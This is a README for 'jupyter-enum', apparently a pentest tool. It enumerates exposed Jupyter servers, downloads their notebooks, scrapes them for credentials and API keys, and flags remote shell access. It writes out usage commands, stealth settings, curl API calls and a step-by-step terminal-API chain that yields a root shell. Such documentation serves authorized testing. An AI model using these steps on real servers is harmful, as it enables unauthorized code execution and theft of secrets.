# jupyter-enum 🔬

> **Jupyter Notebook Enumeration & Recon Tool for Pentesters**
> Built for authorized red team engagements and CTF labs.
> Made by **Aryan Giri**

---

Jupyter instances are increasingly common in AI/ML infrastructure — and frequently left **misconfigured or unauthenticated**. An exposed Jupyter server is a direct path to **remote code execution** via the kernel or terminal API.

`jupyter-enum` automates the full reconnaissance phase: version fingerprinting → file/notebook exfiltration → session/kernel enumeration → RCE surface detection → credential scraping.

---

## Features

| # | Module | Endpoint(s) | What it finds |
|---|---|---|---|
| 1 | Access Check | `/api`, `/tree`, `/lab` | Unauth access, version, server headers — **continues even on 401/403** |
| 2 | File & Notebook Tree | `/api/contents` | Recursive listing, configurable depth |
| 3 | Notebook Accessibility | `/api/contents/<path>` | Per-notebook auth bypass check (**threaded**) |
| 4 | Active Sessions | `/api/sessions` | Open notebooks + kernel IDs |
| 5 | Running Kernels | `/api/kernels` | Live kernels, names, execution state |
| 6 | Terminal Access | `/api/terminals` | **RCE vector** — shell via WebSocket |
| 7 | Kernel Specs | `/api/kernelspecs` | Language, env names, conda/venv paths |
| 8 | Config Exposure | `/api/config/*` | Auth settings, allow_origin, server config |
| 9 | Swagger Docs | `/api/swagger.json` | Full API surface disclosure |
| 10 | Token Patterns | `/login` body, `?token=` URL | Token leakage in HTML and URL params |
| 11 | Recent Activity | `/api/contents` | Last-modified sort — identifies active notebooks |
| 12 | Secret Scraper | `.ipynb` cells | API keys, passwords, AWS keys, private keys, shell execs |
| 13 | Download | `/api/contents/<path>` | Tokenless on open servers, **path traversal protected**, **threaded** |
| 14 | JSON Report | local | Full findings saved to output dir |

---

## Installation

```bash
git clone https://github.com/aryangiri/jupyter-enum
cd jupyter-enum
pip install -r requirements.txt
```

Python 3.10+ required.

---

## Usage

### One-shot full enumeration

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all
```

### Token authentication

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --token abc123def456 --check-all
```

### Password authentication (classic Jupyter login form)

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --password mypassword --check-all
```

### Download all notebooks (tokenless on open servers)

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --download-all
```

### Download a specific notebook

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --download "research/model_train.ipynb"
```

### RCE surface only

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-terminals --enum-kernels
```

### Tune for stealth (slower, shallower)

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all --max-depth 2 --delay 1.5 --threads 2
```

### Route through Burp Suite

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --proxy http://127.0.0.1:8080 --check-all
```

---

## All Flags

```
  -t, --target           Target URL (e.g. http://10.10.45.20:8888)
  --token                API token  [optional]
  --password             Password for classic Jupyter login form  [optional]
  --timeout              Request timeout in seconds (default: 10)
  --proxy                HTTP proxy (e.g. http://127.0.0.1:8080)
  --output-dir           Output directory (default: jupyter_loot)
  --max-depth            Max directory recursion depth (default: 6)
  --delay                Delay between downloads in seconds (default: 0.2)
  --threads              Thread count for parallel ops (default: 10)
  --no-banner            Suppress banner

  --check-all            Run every module in sequence
  --enum-contents        Recursively list all files and notebooks
  --check-notebooks      Test accessibility of each notebook (threaded)
  --enum-sessions        List active notebook sessions
  --enum-kernels         List running kernels and their state
  --check-terminals      Check terminal (RCE) endpoint
  --enum-kernelspecs     List kernel specs (language/env disclosure)
  --check-config         Check config API endpoints
  --check-swagger        Check swagger/API docs exposure
  --check-tokens         Check for token leakage in HTML and URL params
  --recent-activity      Sort notebooks by last modified timestamp
  --download-all         Download all discovered notebooks (threaded)
  --download NB_PATH     Download a specific notebook by path
  --no-scrape            Skip secret scraping on downloaded notebooks
```

---

## Output Structure

```
jupyter_loot/
├── research/
│   └── model_train.ipynb        ← mirrors remote directory structure
├── work/
│   └── data_pipeline.ipynb
└── enum_report.json             ← full JSON findings + severity ratings
```

---

## Security Design

Several protections are built into the tool itself — offensive tools run against unknown infrastructure (including honeypots) need defensive programming too.

**Path Traversal / Zip Slip Protection**
A malicious server can return notebook paths like `../../../../home/user/.ssh/authorized_keys` to overwrite files on your machine. Every download path is resolved and validated to ensure it falls strictly within `--output-dir` before any file is written. Traversal attempts are logged as findings.

**Narrow Exception Handling**
JSON parse errors catch only `JSONDecodeError`/`ValueError`. Network errors catch only `requests.RequestException`. Standard Python errors (e.g. `TypeError` from bad arguments) bubble up normally so bugs surface immediately rather than being swallowed silently.

**Partial Auth Resilience**
The tool continues header inspection and login-page token scraping even when `/api` returns 401/403 — some hardened setups still leak version info in headers, and the login page may contain an embedded token.

**Pre-compiled Regex**
Secret scraping patterns are compiled once at class definition, not per-cell. On notebooks with many cells, this is meaningfully faster.

**Threaded Parallel Execution**
Notebook accessibility checks and bulk downloads use `ThreadPoolExecutor`. Sequential scanning of 200+ notebooks is avoided by default.

---

## The RCE Chain (Terminal API)

If `/api/terminals` is accessible:

```
1. POST /api/terminals
   ← {"name": "1"}

2. Connect WebSocket:
   ws://TARGET:8888/terminals/websocket/1

3. Send:  ["stdin", "id\n"]
   Recv:  ["stdout", "uid=0(root) gid=0(root) groups=0(root)\n"]
```

`jupyter-enum` detects and flags this. Execution is left to the operator.

---

## Jupyter API Quick Reference

```bash
# Version
curl http://TARGET:8888/api

# File tree
curl http://TARGET:8888/api/contents

# Specific notebook content
curl http://TARGET:8888/api/contents/work/model.ipynb

# Active sessions
curl http://TARGET:8888/api/sessions

# Running kernels
curl http://TARGET:8888/api/kernels

# Terminal list
curl http://TARGET:8888/api/terminals

# Kernel specs
curl http://TARGET:8888/api/kernelspecs

# Authenticated
curl -H "Authorization: token <TOKEN>" http://TARGET:8888/api/contents
```

---

## Legal Disclaimer

This tool is intended **solely for authorized penetration testing engagements, CTF competitions, and controlled lab environments**. Unauthorized access to computer systems is illegal. The author accepts no liability for misuse.

---

*Made by Aryan Giri*
